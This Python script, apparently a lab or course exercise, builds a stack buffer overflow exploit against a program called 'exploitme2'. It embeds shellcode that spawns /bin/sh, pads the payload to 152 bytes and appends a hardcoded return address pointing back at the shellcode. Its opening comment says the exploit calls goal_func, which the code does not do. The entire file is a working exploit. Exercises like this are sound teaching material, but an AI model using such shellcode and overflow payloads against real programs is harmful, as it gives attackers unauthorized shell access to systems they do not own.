#!/usr/bin/env python
# This script creates an exploit that calls goal_func in exploitme2

# Step 1: Shellcode
shellcode = b'jhH\xb8/bin///sPH\x89\xe7hri\x01\x01\x814$\x01\x01\x01\x011\xf6Vj\x08^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05'
exploit_byte_string = shellcode

# Step 2: Pad the exploit out to 152 bytes
pad_amount = 152 - len(exploit_byte_string)
exploit_byte_string = exploit_byte_string + b"A"*pad_amount

# Step 3: Write the target address as a little endian byte string

address_of_shellcode = 0x7fffffffde10

goal_address_bstr = address_of_shellcode.to_bytes(8, "little")

# Step 4: Append the target address byte string
exploit_byte_string = exploit_byte_string + goal_address_bstr

# Step 5: Write the exploit to a file
with open("shellcode.exploit", "wb") as f:
    f.write(exploit_byte_string)